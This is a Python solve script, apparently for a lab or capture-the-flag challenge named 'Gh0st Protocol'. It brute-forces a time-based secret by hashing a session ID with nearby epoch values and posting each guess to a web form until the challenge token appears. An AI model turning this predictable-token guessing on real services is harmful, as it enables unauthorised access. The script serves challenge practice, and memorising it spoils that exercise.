#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Solve Gh0st Protocol TOKEN4 via the GUI

Strategy:
  1) (Optional) Poll status endpoint until ready=true (after Token 3).
  2) Compute candidate SHA256 hashes for SESSION_ID + epoch across a ±window.
  3) POST each candidate to the GUI ("hash" form field) until success.
  4) Extract and print TOKEN4.

No third-party deps; uses Python stdlib only.
"""

import argparse
import hashlib
import json
import re
import sys
import time
import urllib.parse
import urllib.request

DEFAULT_URL = "http://gh0st-protocol:8080/"
DEFAULT_STATUS_URL = "http://gh0st-protocol:8081/status"
DEFAULT_SESSION_ID = "GHOSTSYNC-9321"

UA = "Gh0st-Protocol-Client/1.0"

TOKEN4_RE = re.compile(r"(?i)TOKEN4[:\s]+([A-Za-z0-9_\-:\{\}]+)")

def http_get(url: str, timeout: float = 1.5) -> str:
    req = urllib.request.Request(url, method="GET", headers={"User-Agent": UA})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", errors="ignore")

def http_post_form(url: str, data: dict, timeout: float = 1.5) -> str:
    body = urllib.parse.urlencode(data).encode()
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    req = urllib.request.Request(url, data=body, method="POST", headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", errors="ignore")

def is_ready(status_url: str, quiet: bool) -> bool:
    try:
        raw = http_get(status_url, timeout=1.5)
        data = json.loads(raw)
        ready = bool(data.get("ready"))
        if not quiet:
            print(f"[*] Status: armed={data.get('armed')} ready={ready}")
        return ready
    except Exception as e:
        if not quiet:
            print(f"[!] Status check failed: {e}")
        # If status is unreachable, we can still try the GUI directly.
        return False

def extract_token4(html: str):
    m = TOKEN4_RE.search(html)
    return m.group(1) if m else None

def attempt_once(gui_url: str, session_id: str, offset_window: int, quiet: bool):
    # Compute candidates across ±offset_window around *current* epoch.
    now = int(time.time())
    candidates = []
    for off in range(-offset_window, offset_window + 1):
        epoch = str(now + off)
        h = hashlib.sha256((session_id + epoch).encode()).hexdigest()
        candidates.append(h)

    # Submit candidates (earliest first)
    for idx, h in enumerate(candidates, 1):
        if not quiet:
            print(f"[*] Attempt {idx}/{len(candidates)} with epoch≈now{'{:+d}'.format(idx- (offset_window+1)) if not quiet else ''}")
        try:
            html = http_post_form(gui_url, {"hash": h})
        except Exception as e:
            if not quiet:
                print(f"[!] POST error: {e}")
            continue
        tok = extract_token4(html)
        if tok:
            print(f"[+] ✅ TOKEN4: {tok}")
            return True
        # Optional: print last line of html for debugging when verbose
        if not quiet:
            last = [ln for ln in html.splitlines() if ln.strip()]
            if last:
                print(f"    GUI says: {last[-1]}")
    return False

def main():
    ap = argparse.ArgumentParser(description="Beat Gh0st Protocol Token 4.")
    ap.add_argument("--url", default=DEFAULT_URL,
                    help=f"GUI URL (default: {DEFAULT_URL})")
    ap.add_argument("--status-url", default=DEFAULT_STATUS_URL,
                    help=f"Status URL (default: {DEFAULT_STATUS_URL})")
    ap.add_argument("--session-id", default=DEFAULT_SESSION_ID,
                    help=f"SESSION_ID (from SSH memo). Default: {DEFAULT_SESSION_ID}")
    ap.add_argument("--window", type=int, default=3,
                    help="Epoch drift window in seconds (±window). Default: 3")
    ap.add_argument("--retries", type=int, default=5,
                    help="Number of bursts to try before giving up. Default: 5")
    ap.add_argument("--wait", type=float, default=0.35,
                    help="Delay between bursts (seconds). Default: 0.35")
    ap.add_argument("--skip-ready-check", action="store_true",
                    help="Skip polling /status for ready=true.")
    ap.add_argument("-q", "--quiet", action="store_true",
                    help="Less output.")
    args = ap.parse_args()

    if not args.skip_ready_check:
        # Poll readiness up to ~10 seconds (or continue if unreachable)
        deadline = time.time() + 10.0
        while time.time() < deadline:
            if is_ready(args.status_url, quiet=args.quiet):
                break
            time.sleep(0.5)

    # Try several bursts to beat timing jitter
    for attempt in range(1, args.retries + 1):
        if not args.quiet:
            print(f"[*] Burst {attempt}/{args.retries}")
        if attempt_once(args.url, args.session_id, args.window, args.quiet):
            return 0
        time.sleep(args.wait)

    print("[-] Failed to obtain TOKEN4. Check SESSION_ID, readiness, and try increasing --window/--retries.")
    return 1

if __name__ == "__main__":
    sys.exit(main())